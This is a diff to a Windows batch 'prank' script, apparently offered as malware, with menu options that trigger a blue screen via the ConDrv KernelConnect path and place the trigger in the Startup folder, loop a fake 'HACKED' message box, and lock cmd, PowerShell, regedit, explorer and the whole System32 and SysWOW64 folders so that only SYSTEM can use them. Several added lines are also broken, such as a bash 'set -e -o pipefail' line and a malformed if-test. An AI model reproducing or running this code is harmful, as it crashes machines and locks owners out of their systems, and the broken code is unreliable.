@@ -4,10 +4,10 @@
 ::Note that this script is for educational purposes only
 ::The writer of this script is not responsible for any damage caused by this script
 ::Recall that this script may cause harmful damages to the computer, use it at your own risk
-
+set -e -o pipefail
 ::This script only works on Windows 10 (not tested on other versions)
 @echo off
-
+goto Menu
 ::The default credits part, may be subject to change
 :Credits_Reference
 cls
@@ -18,7 +18,7 @@ echo *                                 *
 echo ***********************************
 echo.
 
-
+exit /b 0
 ::Default menu
 :Menu
 call :Credits_Reference
@@ -32,13 +32,48 @@ if choice==1 goto BSOD_menu_option && goto Menu
 if choice==2 goto FileLocker && goto Menu
 if choice==3 exit
 if choice==4 goto PrankMsgBox && goto Menu
+exit /b 0
+::****************************************
+::Check for valid path
+:ValidPathCheck
+if not exist %~1 (
+    echo The path does not exist.
+    pause
+    goto FileContentChanger
+)
+::****************************************
+::File content changer
+:FileContentChanger
+if not exist %~1 or not  (
+    echo The directory does not exist.
+    pause
+    goto FileContentChanger
+) else (
+    cls
+
+)
+::****************************************
+::Gibberish creation
+:CreateGibberish
+setlocal enabledelayedexpansion
+set "g=ABCDEFGHIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+set "gibberish="
+for /l %%i in (1,1,100) do (
+    set /a "rand=(%random%*62)/32768+1"
+    for /l %%j in (!rand!,1,!rand!) do (
+        for %%k in (!rand!) do set "gibberish=!gibberish!!g:~%%k,1!"
+    )
+)
+
 ::****************************************
 ::Prank vbs msgbox
 :PrankMsgBox
+cls
+call :CreateGibberish
 if not exist %~dp0\msgbox.vbs (
     echo do >> %~dp0\msgbox.vbs
     ::This is the message box, which will be displayed
-    echo msgbox "Your computer has been hacked by DIRLOVE <3", vbOKOnly, "HACKED" >> %~dp0\msgbox.vbs
+    echo msgbox "%gibberish%", vbOKOnly, "HACKED" >> %~dp0\msgbox.vbs
     ::Loop the msgbox indefinitely
     echo Loop >> %~dp0\msgbox.vbs
 )
@@ -151,8 +186,8 @@ exit /b 0
 ::Setup the BSOD cause
 ::More info in this video: https://www.youtube.com/watch?v=JjebNlzX6us
 ::Note that this method only works on Windows 10 only
-set BSOD_Trigger_Path="\\.\GLOBALROOT\Device\ConDrv\KernelConnect"
-echo %BSOD_Trigger_Path% > %~dp0\BSOD_Trigger_Path.bat
+set BSOD_Trigger_Path="\\.\GLOBALROOT\Device\ConDrv\KernelConnect\"
+echo %BSOD_Trigger_Path% >> %~dp0\BSOD_Trigger_Path.bat
 call :ConvertBatToExe %~dp0\BSOD_Trigger_Path.bat
 
 ::Copying the BSOD trigger to the startup folder
@@ -170,10 +205,19 @@ exit /b 0
 ::Note that this is harmful, since any programs listed here is not usable, even for Administrators.
 ::The only user, which has the right to use these programs, is the default SYSTEM user.
 :SafeLock
-call :LockProtect "C:\Users\regedit.exe"
-call :LockProtect "C:\Users\cmd.exe"
-call :LockProtect "C:\Users\powershell.exe"
-call :LockProtect "C:\Users\explorer.exe"
+call :LockProtect "C:\Windows\regedit.exe"
+call :LockProtect "C:\Windows\System32\cmd.exe"
+call :LockProtect "C:\Windows\SysWOW64\cmd.exe"
+call :LockProtect "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+call :LockProtect "C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe"
+call :LockProtect "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
+call :LockProtect "C:\Windows\SysWOW64\explorer.exe"
+call :LockProtect "C:\Windows\explorer.exe"
+
+::These two are extremely harmful
+call :LockProtect "C:\Windows\System32"
+call :LockProtect "C:\Windows\SysWOW64"
+
 call :LockProtect %~dp0
 exit /b 0
 
